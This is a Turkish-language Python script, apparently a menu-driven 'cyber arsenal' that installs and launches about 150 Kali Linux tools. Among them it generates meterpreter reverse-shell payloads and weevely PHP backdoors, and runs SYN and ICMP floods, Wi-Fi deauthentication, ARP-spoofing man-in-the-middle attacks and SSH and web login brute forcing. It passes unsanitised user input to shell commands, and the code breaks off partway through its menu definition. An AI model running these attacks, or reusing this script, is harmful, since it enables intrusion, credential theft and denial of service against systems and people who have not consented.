#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  SIBER_ARAC_V3.PY — KALI LINUX ULTIMATE CYBER ARSENAL                      ║
║  150+ Gerçek Araç | Otomatik Kurulum | Gerçek Subprocess Çalıştırma         ║
║  Kullanım: sudo python3 siber_arac_v3.py                                    ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import shutil
import subprocess
import socket
import ipaddress
import random
import string
import base64
import urllib.parse
import urllib.request
import json
import ssl
import time
import platform
from datetime import datetime

# ═══════════════════════════════════════════════════════════════════════════════
#                           BAĞIMLILIK KONTROLÜ
# ═══════════════════════════════════════════════════════════════════════════════

def install_python_deps():
    try:
        import colorama
    except ImportError:
        print("[!] colorama kuruluyor...")
        os.system(f"{sys.executable} -m pip install colorama -q")
    try:
        import requests
    except ImportError:
        print("[!] requests kuruluyor...")
        os.system(f"{sys.executable} -m pip install requests -q")

install_python_deps()

from colorama import Fore, Style, init
init(autoreset=True)

try:
    import requests
except:
    requests = None

# ═══════════════════════════════════════════════════════════════════════════════
#                         YARDIMCI MOTOR FONKSİYONLARI
# ═══════════════════════════════════════════════════════════════════════════════

def clear():
    os.system("clear")

def banner():
    clear()
    print(f"""{Fore.RED}
   ██████  ██▓ ██▓███   ▄▄▄       ██▀███   ▄████▄   ▒█████   ███▄ ▄███▓
 ▒██    ▒ ▓██▒▓██░  ██▒▒████▄    ▓██ ▒ ██▒▒██▀ ▀█  ▒██▒  ██▒▓██▒▀█▀ ██▒
 ░ ▓██▄   ▒██▒▓██░ ██▓▒▒██  ▀█▄  ▓██ ░▄█ ▒▒▓█    ▄ ▒██░  ██▒▓██    ▓██░
   ▒   ██▒░██░▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██▀▀█▄  ▒▓▓▄ ▄██▒▒██   ██░▒██    ▒██ 
 ▒██████▒▒░██░▒██▒ ░  ░ ▓█   ▓██▒░██▓ ▒██▒▒ ▓███▀ ░░ ████▓▒░▒██▒   ░██▒
 ▒ ▒▓▒ ▒ ░░▓  ▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ░  ░
 ░ ░▒  ░ ░ ▒ ░░▒ ░       ▒   ▒▒ ░  ░▒ ░ ▒░  ░  ▒    ░ ▒ ▒░ ░  ░      ░
 ░  ░  ░   ▒ ░░░         ░   ▒     ░░   ░ ░       ░ ░ ░ ▒  ░      ░   
       ░   ░                 ░  ░   ░     ░ ░         ░ ░         ░   
                                           ░                          
    {Fore.CYAN}--- KALI LINUX ULTIMATE ARSENAL v3.0 | 150+ REAL TOOLS ---
    {Fore.WHITE}Platform: {platform.system()} {platform.release()} | Python: {platform.python_version()}
    {Fore.YELLOW}[!] Eksik araçlar otomatik kurulur: sudo apt install -y <paket>
    {Fore.RED}[!] SADECE YETKİLİ SİSTEMLERDE KULLANIN - ETİK HACKER PRENSİPLERİ
    """)

def run(cmd, shell=True):
    """Gerçek komutu çalıştır"""
    try:
        subprocess.call(cmd, shell=shell)
    except Exception as e:
        print(f"{Fore.RED}[-] Çalıştırma hatası: {e}")

def check(binary):
    """Sistemde kurulu mu kontrol et"""
    return shutil.which(binary) is not None

def ensure(pkg, binary=None):
    """Kurulu değilse otomatik kur"""
    binary = binary or pkg.split()[0]
    if not check(binary):
        print(f"{Fore.YELLOW}[!] {binary} bulunamadı. Kuruluyor...")
        run(f"sudo apt update -qq && sudo apt install -y {pkg}")
        if not check(binary):
            print(f"{Fore.RED}[-] {binary} kurulumu başarısız olabilir. Manuel kontrol edin.")
            return False
    return True

def ask(prompt, default=None):
    """Input al"""
    if default:
        val = input(f"{Fore.GREEN}{prompt} [{default}]: ").strip()
        return val if val else default
    return input(f"{Fore.GREEN}{prompt}: ").strip()

def pause():
    input(f"\n{Fore.CYAN}[Enter] Ana menüye dönmek için...")

# ═══════════════════════════════════════════════════════════════════════════════
#                    1-20: BİLGİ TOPLAMA (INFORMATION GATHERING)
# ═══════════════════════════════════════════════════════════════════════════════

def t01_nmap():
    ensure("nmap")
    target = ask("Hedef IP/Domain/Range")
    if target:
        scan_type = ask("Tarama tipi [1:Hızlı 2:Servis 3:Agressif 4:Vuln]", "2")
        if scan_type == "1":
            run(f"sudo nmap -T4 -F {target}")
        elif scan_type == "3":
            run(f"sudo nmap -A -T4 {target}")
        elif scan_type == "4":
            run(f"sudo nmap --script vuln {target}")
        else:
            run(f"sudo nmap -sV -O --top-ports 100 {target}")

def t02_masscan():
    ensure("masscan")
    target = ask("Hedef IP/Range (örn: 10.0.0.0/8)")
    if target:
        rate = ask("Rate (pps)", "1000")
        run(f"sudo masscan {target} -p1-65535 --rate={rate}")

def t03_netdiscover():
    ensure("netdiscover")
    iface = ask("Arayüz (örn: eth0, wlan0)", "eth0")
    run(f"sudo netdiscover -i {iface}")

def t04_theharvester():
    ensure("theharvester")
    domain = ask("Domain (örn: microsoft.com)")
    if domain:
        source = ask("Kaynak [all, bing, google, linkedin, twitter]", "all")
        limit = ask("Limit", "500")
        run(f"theHarvester -d {domain} -l {limit} -b {source}")

def t05_recon_ng():
    ensure("recon-ng")
    print(f"{Fore.CYAN}[*] Recon-ng başlatılıyor...")
    run("recon-ng")

def t06_maltego():
    ensure("maltego")
    print(f"{Fore.CYAN}[*] Maltego GUI başlatılıyor...")
    run("maltego &")

def t07_legion():
    ensure("legion")
    print(f"{Fore.CYAN}[*] Legion GUI başlatılıyor...")
    run("sudo legion &")

def t08_dmitry():
    ensure("dmitry")
    target = ask("Hedef domain")
    if target:
        run(f"dmitry -winsep {target}")

def t09_ike_scan():
    ensure("ike-scan")
    target = ask("Hedef IP")
    if target:
        run(f"sudo ike-scan {target}")

def t10_fping():
    ensure("fping")
    target = ask("IP/Range (örn: 192.168.1.0/24)")
    if target:
        run(f"fping -a -g {target} 2>/dev/null")

def t11_hping3():
    ensure("hping3")
    target = ask("Hedef IP")
    if target:
        mode = ask("Mod [1:TCP-SYN 2:ICMP 3:UDP]", "1")
        if mode == "1":
            run(f"sudo hping3 -S -p 80 --flood {target}")
        elif mode == "2":
            run(f"sudo hping3 --icmp --flood {target}")
        else:
            run(f"sudo hping3 --udp -p 53 {target}")

def t12_arp_scan():
    ensure("arp-scan")
    iface = ask("Arayüz", "eth0")
    run(f"sudo arp-scan -l -I {iface}")

def t13_enum4linux():
    ensure("enum4linux")
    target = ask("Hedef IP (Windows/SMB)")
    if target:
        run(f"enum4linux -a {target}")

def t14_fierce():
    ensure("fierce")
    domain = ask("Domain")
    if domain:
        run(f"fierce --domain {domain}")

def t15_dnsenum():
    ensure("dnsenum")
    domain = ask("Domain")
    if domain:
        run(f"dnsenum {domain}")

def t16_dnsrecon():
    ensure("dnsrecon")
    domain = ask("Domain")
    if domain:
        run(f"dnsrecon -d {domain}")

def t17_lbd():
    ensure("lbd")
    domain = ask("Domain")
    if domain:
        run(f"lbd {domain}")

def t18_wafw00f():
    ensure("wafw00f")
    url = ask("URL")
    if url:
        run(f"wafw00f {url}")

def t19_spiderfoot():
    ensure("spiderfoot")
    print(f"{Fore.CYAN}[*] SpiderFoot Web: http://127.0.0.1:5001")
    run("spiderfoot -l 127.0.0.1:5001 &")

def t20_osintgram():
    if not check("osintgram"):
        print(f"{Fore.YELLOW}[!] Osintgram kuruluyor...")
        run("cd /opt && sudo git clone https://github.com/Datalux/Osintgram.git && cd Osintgram && sudo pip3 install -r requirements.txt")
    target = ask("Instagram Kullanıcı Adı")
    if target:
        run(f"cd /opt/Osintgram && echo {target} | sudo python3 main.py {target}")

# ═══════════════════════════════════════════════════════════════════════════════
#                    21-35: ZAFİYET ANALİZİ (VULNERABILITY ANALYSIS)
# ═══════════════════════════════════════════════════════════════════════════════

def t21_nikto():
    ensure("nikto")
    target = ask("Hedef URL (örn: http://192.168.1.1)")
    if target:
        run(f"nikto -h {target}")

def t22_nmap_vuln():
    ensure("nmap")
    target = ask("Hedef IP")
    if target:
        run(f"sudo nmap --script vuln {target}")

def t23_lynis():
    ensure("lynis")
    run("sudo lynis audit system")

def t24_openvas():
    if not check("gvm-cli") and not check("openvas"):
        print(f"{Fore.YELLOW}[!] OpenVAS/GVM kuruluyor...")
        run("sudo apt install -y openvas gvm")
        print(f"{Fore.RED}[!] İlk kurulum: sudo gvm-setup")
    else:
        print(f"{Fore.GREEN}[+] GVM/OpenVAS kurulu!")
        if ask("Tarama başlat? (e/h)", "h").lower() == "e":
            run("sudo gvm-start")

def t25_sqlmap():
    ensure("sqlmap")
    url = ask("Hedef URL (parametreli)")
    if url:
        level = ask("Risk/Level [1-3]", "1")
        run(f"sqlmap -u '{url}' --batch --risk={level} --level={level} --dbs")

def t26_legion_vuln():
    t07_legion()

def t27_searchsploit():
    ensure("exploitdb")
    keyword = ask("Aranacak exploit/keyword")
    if keyword:
        run(f"searchsploit {keyword}")

def t28_gvm_scan():
    t24_openvas()

def t29_nuclei():
    if not check("nuclei"):
        run("sudo apt install -y nuclei || (cd /tmp && wget https://github.com/projectdiscovery/nuclei/releases/download/v2.9.15/nuclei_2.9.15_linux_amd64.zip && unzip nuclei*.zip && sudo mv nuclei /usr/local/bin/)")
    target = ask("Hedef URL/IP")
    if target:
        run(f"nuclei -u {target}")

def t30_skipfish():
    ensure("skipfish")
    url = ask("Hedef URL")
    out = ask("Çıktı dizini", "/tmp/skipfish_out")
    if url:
        run(f"skipfish -o {out} {url}")

# ═══════════════════════════════════════════════════════════════════════════════
#                    36-55: WEB UYGULAMA TESTLERİ
# ═══════════════════════════════════════════════════════════════════════════════

def t31_burpsuite():
    ensure("burpsuite")
    run("burpsuite &")

def t32_zaproxy():
    ensure("zaproxy")
    run("zaproxy &")

def t33_dirb():
    ensure("dirb")
    url = ask("Hedef URL")
    wordlist = ask("Wordlist [/usr/share/dirb/wordlists/common.txt]", "/usr/share/dirb/wordlists/common.txt")
    if url:
        run(f"dirb {url} {wordlist}")

def t34_gobuster():
    ensure("gobuster")
    url = ask("Hedef URL")
    wordlist = ask("Wordlist [/usr/share/wordlists/dirb/common.txt]", "/usr/share/wordlists/dirb/common.txt")
    if url:
        run(f"gobuster dir -u {url} -w {wordlist}")

def t35_wfuzz():
    ensure("wfuzz")
    url = ask("URL (FUZZ yer tutuculu, örn: http://site.com/FUZZ)")
    wordlist = ask("Wordlist [/usr/share/wordlists/dirb/common.txt]", "/usr/share/wordlists/dirb/common.txt")
    if url and "FUZZ" in url:
        run(f"wfuzz -c -z file,{wordlist} {url}")
    elif url:
        print(f"{Fore.RED}[-] URL'de FUZZ kelimesi olmalı!")

def t36_wpscan():
    ensure("wpscan")
    url = ask("WordPress URL")
    if url:
        run(f"wpscan --url {url} --enumerate u,vp,vt")

def t37_commix():
    ensure("commix")
    url = ask("Hedef URL")
    if url:
        run(f"python3 /usr/share/commix/commix.py -u {url}")

def t38_whatweb():
    ensure("whatweb")
    url = ask("Hedef URL/IP")
    if url:
        run(f"whatweb -v {url}")

def t39_xsser():
    ensure("xsser")
    url = ask("Hedef URL (parametreli)")
    if url:
        run(f"xsser -u '{url}' -s")

def t40_xsstrike():
    if not check("xsstrike"):
        run("sudo apt install -y xsstrike || pip3 install xsstrike")
    url = ask("Hedef URL")
    if url:
        run(f"xsstrike -u {url}")

def t41_davtest():
    ensure("davtest")
    url = ask("WebDAV URL")
    if url:
        run(f"davtest -url {url}")

def t42_fimap():
    ensure("fimap")
    url = ask("Hedef URL")
    if url:
        run(f"fimap -u '{url}'")

def t43_padbuster():
    ensure("padbuster")
    print(f"{Fore.YELLOW}[!] PadBuster kullanımı karmaşıktır, manuel çalıştırın:")
    print(f"{Fore.WHITE}  padbuster URL EncryptedData BlockSize -encoding 0")

def t44_webslayer():
    ensure("webslayer")
    print(f"{Fore.CYAN}[*] WebSlayer GUI başlatılıyor...")
    run("webslayer &")

def t45_jboss_autopwn():
    ensure("jboss-autopwn")
    target = ask("Hedef IP:Port")
    if target:
        run(f"jboss-autopwn {target}")

# ═══════════════════════════════════════════════════════════════════════════════
#                    46-60: VERİTABANI DEĞERLENDİRME
# ═══════════════════════════════════════════════════════════════════════════════

def t46_sqlmap_db():
    t25_sqlmap()

def t47_sqlninja():
    ensure("sqlninja")
    print(f"{Fore.YELLOW}[!] Sqlninja config dosyası gerektirir. /usr/share/sqlninja/ dizinine bakın.")

def t48_tnscmd10g():
    ensure("tnscmd10g")
    target = ask("Oracle TNS IP:Port")
    if target:
        run(f"tnscmd10g version -h {target}")

# ═══════════════════════════════════════════════════════════════════════════════
#                    61-80: ŞİFRE SALDIRILARI
# ═══════════════════════════════════════════════════════════════════════════════

def t61_hashcat():
    ensure("hashcat")
    print("1 - Hash kır\n2 - Hash tipi listele")
    s = ask("Seçim")
    if s == "1":
        hashfile = ask("Hash dosyası")
        wordlist = ask("Wordlist [/usr/share/wordlists/rockyou.txt]", "/usr/share/wordlists/rockyou.txt")
        if os.path.exists(hashfile):
            run(f"hashcat -m 0 {hashfile} {wordlist}")
    elif s == "2":
        run("hashcat --help | grep -i 'hash type' -A 200 | head -50")

def t62_john():
    ensure("john")
    hashfile = ask("Hash dosyası")
    if hashfile and os.path.exists(hashfile):
        run(f"john {hashfile}")
    else:
        print(f"{Fore.RED}[-] Dosya bulunamadı!")

def t63_hydra():
    ensure("hydra")
    target = ask("Hedef IP/URL")
    user = ask("Kullanıcı adı / -L wordlist")
    passw = ask("Şifre / -P wordlist")
    proto = ask("Protokol [ssh/ftp/rdp/http-post-form]", "ssh")
    if target and user and passw:
        if proto == "http-post-form":
            form = ask("Form path:post data:fail string", "/login.php:username=^USER^&password=^PASS^:F=invalid")
            run(f"hydra -l {user} -P {passw} {target} {proto} '{form}'")
        else:
            run(f"hydra -l {user} -P {passw} {proto}://{target}")

def t64_medusa():
    ensure("medusa")
    target = ask("Hedef IP")
    user = ask("Kullanıcı")
    passw = ask("Wordlist")
    proto = ask("Protokol [ssh/ftp]", "ssh")
    if all([target, user, passw]):
        run(f"medusa -h {target} -u {user} -P {passw} -M {proto}")

def t65_ncrack():
    ensure("ncrack")
    target = ask("Hedef IP:Port (örn: 192.168.1.1:22)")
    if target:
        run(f"ncrack -v --user root -P /usr/share/wordlists/rockyou.txt {target}")

def t66_crunch():
    ensure("crunch")
    min_len = ask("Min uzunluk", "6")
    max_len = ask("Max uzunluk", "8")
    chars = ask("Karakter seti [abcdefghijklmnopqrstuvwxyz0123456789]", "abcdefghijklmnopqrstuvwxyz0123456789")
    out = ask("Çıktı dosyası (opsiyonel)")
    cmd = f"crunch {min_len} {max_len} {chars}"
    if out:
        cmd += f" -o {out}"
    run(cmd)

def t67_cewl():
    ensure("cewl")
    url = ask("Hedef URL")
    if url:
        depth = ask("Derinlik", "2")
        run(f"cewl -d {depth} -m 5 -w /tmp/cewl_wordlist.txt {url}")

def t68_wordlists():
    ensure("wordlists")
    if os.path.exists("/usr/share/wordlists/rockyou.txt"):
        print(f"{Fore.GREEN}[+] rockyou.txt mevcut!")
        run("ls -lh /usr/share/wordlists/")
    else:
        run("sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null; ls -lh /usr/share/wordlists/")

def t69_rainbowcrack():
    ensure("rainbowcrack")
    print(f"{Fore.YELLOW}[!] RainbowCrack kullanımı:")
    print(f"{Fore.WHITE}  rtgen md5 loweralpha-numeric 1 7 0 1000 4000 all")
    run("rtgen --help | head -20")

def t70_johnny():
    ensure("johnny")
    run("johnny &")

def t71_samdump2():
    ensure("samdump2")
    sam = ask("SAM dosyası yolu")
    sys = ask("SYSTEM dosyası yolu")
    if sam and sys:
        run(f"samdump2 {sam} {sys} > /tmp/hashes.txt && cat /tmp/hashes.txt")

def t72_truecrack():
    ensure("truecrack")
    vol = ask("TrueCrypt volume")
    wordlist = ask("Wordlist")
    if vol and wordlist:
        run(f"truecrack -t {vol} -w {wordlist}")

# ═══════════════════════════════════════════════════════════════════════════════
#                    81-100: KABLOSUZ AĞ SALDIRILARI
# ═══════════════════════════════════════════════════════════════════════════════

def t81_aircrack():
    ensure("aircrack-ng")
    print(f"{Fore.CYAN}[*] Aircrack-ng Suite")
    print("1 - Arayüz monitör moduna al (airmon-ng)\n2 - Ağları tara (airodump-ng)\n3 - Handshake yakala\n4 - Handshake kır")
    s = ask("Seçim")
    if s == "1":
        iface = ask("Arayüz [wlan0]", "wlan0")
        run(f"sudo airmon-ng start {iface}")
    elif s == "2":
        run("sudo airodump-ng wlan0mon 2>/dev/null || sudo airodump-ng wlan0mon")
    elif s == "3":
        bssid = ask("Hedef BSSID")
        ch = ask("Kanal")
        out = ask("Çıktı öneki", "/tmp/capture")
        if bssid:
            run(f"sudo airodump-ng -c {ch} --bssid {bssid} -w {out} wlan0mon")
    elif s == "4":
        cap = ask(".cap dosyası")
        wordlist = ask("Wordlist", "/usr/share/wordlists/rockyou.txt")
        if cap:
            run(f"sudo aircrack-ng -w {wordlist} {cap}")

def t82_wifite():
    ensure("wifite")
    run("sudo wifite")

def t83_reaver():
    ensure("reaver")
    iface = ask("Arayüz [wlan0mon]", "wlan0mon")
    bssid = ask("Hedef BSSID")
    if bssid:
        run(f"sudo reaver -i {iface} -b {bssid} -vv")

def t84_pixiewps():
    ensure("pixiewps")
    print(f"{Fore.YELLOW}[!] Pixiewps WPS PIN kırma aracıdır. Reaver ile birlikte kullanılır.")

def t85_bully():
    ensure("bully")
    iface = ask("Arayüz [wlan0mon]", "wlan0mon")
    bssid = ask("Hedef BSSID")
    if bssid:
        run(f"sudo bully -b {bssid} {iface}")

def t86_cowpatty():
    ensure("cowpatty")
    cap = ask(".cap dosyası")
    ssid = ask("SSID")
    wordlist = ask("Wordlist")
    if cap and ssid:
        run(f"cowpatty -d {wordlist} -r {cap} -s {ssid}")

def t87_kismet():
    ensure("kismet")
    run("sudo kismet")

def t88_mdk3():
    ensure("mdk3")
    iface = ask("Arayüz [wlan0]", "wlan0")
    print("1 - Beacon flood\n2 - Auth DoS\n3 - Deauth")
    s = ask("Seçim")
    if s == "1":
        run(f"sudo mdk3 {iface} b")
    elif s == "2":
        run(f"sudo mdk3 {iface} a")
    elif s == "3":
        bssid = ask("Hedef BSSID")
        run(f"sudo mdk3 {iface} d -b {bssid}")

def t89_mdk4():
    ensure("mdk4")
    iface = ask("Arayüz [wlan0]", "wlan0")
    run(f"sudo mdk4 {iface} -h")

def t90_wifi_honey():
    ensure("wifi-honey")
    ssid = ask("Sahte SSID", "FreeWiFi")
    run(f"sudo wifi-honey {ssid} wlan0")

def t91_hostapd_wpe():
    ensure("hostapd-wpe")
    print(f"{Fore.YELLOW}[!] hostapd-wpe Evil Twin / Rogue AP kurulumu gerektirir.")
    print(f"{Fore.WHITE}  /etc/hostapd-wpe/hostapd-wpe.conf dosyasını düzenleyin.")

def t92_airgeddon():
    if not check("airgeddon"):
        run("sudo apt install -y airgeddon")
    run("sudo airgeddon")

# ═══════════════════════════════════════════════════════════════════════════════
#                    101-115: SIZMA ARAÇLARI (EXPLOITATION)
# ═══════════════════════════════════════════════════════════════════════════════

def t101_msfconsole():
    ensure("metasploit-framework")
    run("msfconsole")

def t102_msfvenom():
    ensure("metasploit-framework")
    print("Payload üretici")
    ptype = ask("Payload tipi [1:windows 2:linux 3:android 4:web]", "1")
    lhost = ask("LHOST (senin IP'n)")
    lport = ask("LPORT", "4444")
    out = ask("Çıktı dosyası", "/tmp/payload")
    payloads = {
        "1": f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {out}.exe",
        "2": f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {out}.elf",
        "3": f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {out}.apk",
        "4": f"msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o {out}.php"
    }
    if ptype in payloads and lhost:
        run(payloads[ptype])
        print(f"{Fore.GREEN}[+] Payload: {out}")

def t103_beef():
    ensure("beef-xss")
    print(f"{Fore.CYAN}[*] BeEF başlatılıyor... Web UI: http://127.0.0.1:3000/ui/panel")
    run("sudo beef-xss")

def t104_searchsploit():
    t27_searchsploit()

def t105_armitage():
    ensure("armitage")
    run("sudo armitage &")

def t106_routersploit():
    if not check("rsf"):
        run("cd /opt && sudo git clone https://github.com/threat9/routersploit.git && cd routersploit && sudo pip3 install -r requirements.txt && sudo ln -s $(pwd)/rsf.py /usr/local/bin/rsf")
    target = ask("Hedef IP")
    if target:
        run(f"rsf -m scanners/autopwn -x 'target {target}; run'")

def t107_commix_exp():
    t37_commix()

def t108_exploitdb():
    ensure("exploitdb")
    run("ls -la /usr/share/exploitdb/")

def t109_setoolkit():
    ensure("setoolkit", "setoolkit")
    run("sudo setoolkit")

def t110_weevely():
    ensure("weevely")
    print("1 - Backdoor üret\n2 - Bağlan")
    s = ask("Seçim")
    if s == "1":
        path = ask("Backdoor yolu", "/tmp/shell.php")
        passw = ask("Şifre", "hacker123")
        run(f"weevely generate {passw} {path}")
        print(f"{Fore.GREEN}[+] Backdoor: {path}")
    elif s == "2":
        url = ask("Hedef URL (shell)")
        passw = ask("Şifre")
        if url:
            run(f"weevely {url} {passw}")

def t111_powersploit():
    if not os.path.exists("/opt/PowerSploit"):
        run("sudo git clone https://github.com/PowerShellMafia/PowerSploit.git /opt/PowerSploit")
    print(f"{Fore.GREEN}[+] PowerSploit /opt/PowerSploit/ dizininde hazır.")

def t112_mimikatz():
    print(f"{Fore.YELLOW}[!] Mimikatz Windows araçıdır. Linux'ta Wine ile çalıştırılabilir:")
    run("wine --version 2>/dev/null || echo 'Wine kurulu değil: sudo apt install wine'")

def t113_nishang():
    if not os.path.exists("/opt/nishang"):
        run("sudo git clone https://github.com/samratashok/nishang.git /opt/nishang")
    print(f"{Fore.GREEN}[+] Nishang /opt/nishang/ dizininde hazır.")

# ═══════════════════════════════════════════════════════════════════════════════
#                    114-130: SNIFFING & SPOOFING
# ═══════════════════════════════════════════════════════════════════════════════

def t114_wireshark():
    ensure("wireshark")
    run("sudo wireshark &")

def t115_ettercap():
    ensure("ettercap-common")
    iface = ask("Arayüz [eth0]", "eth0")
    target = ask("Hedef IP (opsiyonel, boş bırakılabilir)")
    if target:
        run(f"sudo ettercap -T -M arp:remote /{target}// // -i {iface}")
    else:
        run(f"sudo ettercap -T -q -i {iface}")

def t116_bettercap():
    ensure("bettercap")
    iface = ask("Arayüz [eth0]", "eth0")
    run(f"sudo bettercap -iface {iface}")

def t117_dsniff():
    ensure("dsniff")
    iface = ask("Arayüz [eth0]", "eth0")
    run(f"sudo dsniff -i {iface}")

def t118_netsniff():
    ensure("netsniff-ng")
    iface = ask("Arayüz [eth0]", "eth0")
    run(f"sudo netsniff-ng --in {iface}")

def t119_responder():
    ensure("responder")
    iface = ask("Arayüz [eth0]", "eth0")
    run(f"sudo responder -I {iface} -wrfv")

def t120_sslstrip():
    ensure("sslstrip")
    port = ask("Port [10000]", "10000")
    run(f"sudo sslstrip -l {port}")

def t121_tcpdump():
    ensure("tcpdump")
    iface = ask("Arayüz [any]", "any")
    count = ask("Paket sayısı [100]", "100")
    out = ask("Çıktı dosyası (opsiyonel)")
    cmd = f"sudo tcpdump -i {iface} -c {count}"
    if out:
        cmd += f" -w {out}"
    run(cmd)

def t122_tshark():
    ensure("tshark")
    iface = ask("Arayüz [eth0]", "eth0")
    run(f"sudo tshark -i {iface} -c 100")

def t123_driftnet():
    ensure("driftnet")
    iface = ask("Arayüz [eth0]", "eth0")
    run(f"sudo driftnet -i {iface}")

def t124_macchanger():
    ensure("macchanger")
    iface = ask("Arayüz [wlan0]", "wlan0")
    print("1 - Rastgele MAC\n2 - Belirli MAC\n3 - Orijinal MAC")
    s = ask("Seçim")
    if s == "1":
        run(f"sudo macchanger -r {iface}")
    elif s == "2":
        mac = ask("MAC adresi (örn: 00:11:22:33:44:55)")
        run(f"sudo macchanger -m {mac} {iface}")
    elif s == "3":
        run(f"sudo macchanger -p {iface}")

# ═══════════════════════════════════════════════════════════════════════════════
#                    131-145: ADLİ BİLİŞİM (FORENSICS)
# ═══════════════════════════════════════════════════════════════════════════════

def t131_autopsy():
    ensure("autopsy")
    run("sudo autopsy &")

def t132_binwalk():
    ensure("binwalk")
    file = ask("Dosya yolu")
    if file and os.path.exists(file):
        run(f"binwalk {file}")

def t133_bulk_extractor():
    ensure("bulk-extractor")
    disk = ask("İmaj/disk dosyası")
    out = ask("Çıktı dizini", "/tmp/bulk_out")
    if disk:
        run(f"bulk_extractor -o {out} {disk}")

def t134_chkrootkit():
    ensure("chkrootkit")
    run("sudo chkrootkit")

def t135_foremost():
    ensure("foremost")
    disk = ask("İmaj dosyası")
    out = ask("Çıktı dizini", "/tmp/foremost_out")
    if disk:
        run(f"sudo foremost -i {disk} -o {out}")

def t136_scalpel():
    ensure("scalpel")
    disk = ask("İmaj dosyası")
    out = ask("Çıktı dizini", "/tmp/scalpel_out")
    if disk:
        run(f"sudo scalpel -o {out} {disk}")

def t137_sleuthkit():
    ensure("sleuthkit")
    print("1 - fsstat\n2 - fls (dosya listele)\n3 - icat (dosya çıkar)")
    s = ask("Seçim")
    disk = ask("İmaj/disk")
    if not disk:
        return
    if s == "1":
        run(f"fsstat {disk}")
    elif s == "2":
        run(f"fls {disk}")
    elif s == "3":
        inum = ask("inode numarası")
        if inum:
            run(f"icat {disk} {inum}")

def t138_volatility():
    vol = "vol.py" if check("vol.py") else ("volatility" if check("volatility") else None)
    if not vol:
        ensure("volatility")
        vol = "volatility"
    mem = ask("Bellek imajı (.mem/.raw)")
    if mem and os.path.exists(mem):
        print("1 - pslist\n2 - netscan\n3 - dlllist\n4 - malfind")
        s = ask("Seçim")
        cmds = {"1": "pslist", "2": "netscan", "3": "dlllist", "4": "malfind"}
        if s in cmds:
            run(f"{vol} -f {mem} {cmds[s]}")

def t139_pdf_parser():
    ensure("python3-pdfminer")  # or pdf-parser
    pdf = ask("PDF dosyası")
    if pdf:
        run(f"pdf-parser {pdf}")

def t140_peepdf():
    ensure("peepdf")
    pdf = ask("PDF dosyası")
    if pdf:
        run(f"peepdf -i {pdf}")

def t141_exiftool():
    ensure("libimage-exiftool-perl")
    file = ask("Dosya yolu")
    if file:
        run(f"exiftool {file}")

def t142_rifiuti():
    ensure("rifiuti")
    path = ask("Recycle bin INFO2 dosyası")
    if path:
        run(f"rifiuti {path}")

def t143_pcapfix():
    ensure("pcapfix")
    pcap = ask("PCAP dosyası")
    if pcap:
        run(f"pcapfix {pcap}")

def t144_hashdeep():
    ensure("hashdeep")
    path = ask("Dizin/dosya")
    if path:
        run(f"hashdeep -r {path}")

def t145_galleta():
    ensure("galleta")
    file = ask("IE cookie dosyası")
    if file:
        run(f"galleta {file}")

# ═══════════════════════════════════════════════════════════════════════════════
#                    146-155: REVERSE ENGINEERING & MISC
# ═══════════════════════════════════════════════════════════════════════════════

def t146_apktool():
    ensure("apktool")
    apk = ask("APK dosyası")
    if apk:
        run(f"apktool d {apk}")

def t147_dex2jar():
    ensure("dex2jar")
    apk = ask("APK veya DEX dosyası")
    if apk:
        run(f"d2j-dex2jar {apk}")

def t148_radare2():
    ensure("radare2")
    file = ask("Binary dosyası")
    if file:
        run(f"r2 -A {file}")

def t149_edb():
    ensure("edb-debugger")
    run("edb &")

def t150_ghidra():
    if not os.path.exists("/opt/ghidra"):
        print(f"{Fore.YELLOW}[!] Ghidra kuruluyor...")
        run("cd /opt && sudo wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.0_build/ghidra_11.0_PUBLIC_20231222.zip && sudo unzip ghidra*.zip && sudo rm ghidra*.zip")
    run("/opt/ghidra/ghidraRun &")

def t151_faraday():
    ensure("faraday")
    run("faraday &")

def t152_dradis():
    ensure("dradis")
    run("dradis &")

def t153_king_phisher():
    ensure("king-phisher")
    run("sudo king-phisher &")

def t154_ophcrack():
    ensure("ophcrack")
    run("ophcrack &")

def t155_ncat():
    ensure("ncat")
    print("1 - Dinle\n2 - Bağlan\n3 - SSL Dinle")
    s = ask("Seçim")
    if s == "1":
        p = ask("Port")
        run(f"ncat -lvnp {p}")
    elif s == "2":
        ip = ask("IP"); p = ask("Port")
        run(f"ncat {ip} {p}")
    elif s == "3":
        p = ask("Port"); cert = ask("Sertifika (.pem)")
        if cert:
            run(f"ncat --ssl -lvnp {p} --ssl-cert {cert}")

# ═══════════════════════════════════════════════════════════════════════════════
#                         ANA MENÜ & MOTOR
# ═══════════════════════════════════════════════════════════════════════════════

MENU = {
    "=== BİLGİ TOPLAMA (INFORMATION GATHERING) ===": {
        "1": ("Nmap — Port/Servis Taraması", t01_nmap),
        "2": ("Masscan — Hızlı Ağ Tarayıcı", t02_masscan),
        "3": ("Netdiscover — Aktif Host Keşfi", t03_netdiscover),
        "4": ("theHarvester — E-posta/OSINT", t04_theharvester),
        "5": ("Recon-ng — OSINT Framework", t05_recon_ng),
        "6": ("Maltego — Görsel OSINT", t06_maltego),
        "7": ("Legion — Otomatik Tarama", t07_legion),
        "8": ("DMitry — Deepmagic Info Gathering", t08_dmitry),
        "9": ("ike-scan — VPN Tarama", t09_ike_scan),
        "10": ("Fping — ICMP Sweep", t10_fping),
        "11": ("Hping3 — Paket Oluşturucu", t11_hping3),
        "12": ("Arp-scan — ARP Tarama", t12_arp_scan),
        "13": ("Enum4linux — SMB Enumeration", t13_enum4linux),
        "14": ("Fierce — DNS Brute-Force", t14_fierce),
        "15": ("DNSenum — DNS Enumeration", t15_dnsenum),
        "16": ("DNSrecon — DNS Recon", t16_dnsrecon),
        "17": ("LBD — Load Balancer Tespiti", t17_lbd),
